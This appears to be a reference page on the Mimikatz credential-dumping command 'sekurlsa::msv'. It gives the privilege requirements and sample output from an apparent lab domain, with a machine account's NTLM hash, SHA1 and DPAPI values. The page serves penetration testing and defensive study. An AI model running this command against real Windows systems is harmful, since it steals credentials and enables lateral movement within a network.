# msv

It dumps and lists the NT hash (and other secrets) by targeting the [MSV1\_0 Authentication Package](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package).

{% hint style="info" %}
LM and NT hashes are used to authenticate accounts using the NTLM protocol. These hashes are often called NTLM hash and many documentations, resources, blogpost and tools mix terms. In this case, "ntlm" refers to the NT hash.

([more information](https://www.thehacker.recipes/ad/movement/ntlm))
{% endhint %}

{% hint style="warning" %}
This command requires elevated privileges (by previously running [`privilege::debug`](../privilege/debug.md) or by executing Mimikatz as the `NT-AUTHORITY\SYSTEM` account).
{% endhint %}

```
mimikatz # sekurlsa::msv

Authentication Id : 0 ; 712960 (00000000:000ae100)
Session           : Service from 0
User Name         : MediaAdmin$
Domain            : hacklab
Logon Server      : DC
Logon Time        : 9/26/2021 4:57:38 AM
SID               : S-1-5-21-2725560159-1428537199-2260736313-1427
        msv :
         [00000003] Primary
         * Username : MediaAdmin$
         * Domain   : hacklab
         * NTLM     : 35950fdc8d3d99b4136510414009662d
         * SHA1     : 185535108abf1fc0287dedbaff210b77989251c8
         * DPAPI    : 73006d59c6adcf27da6e097787a6d1f9
```
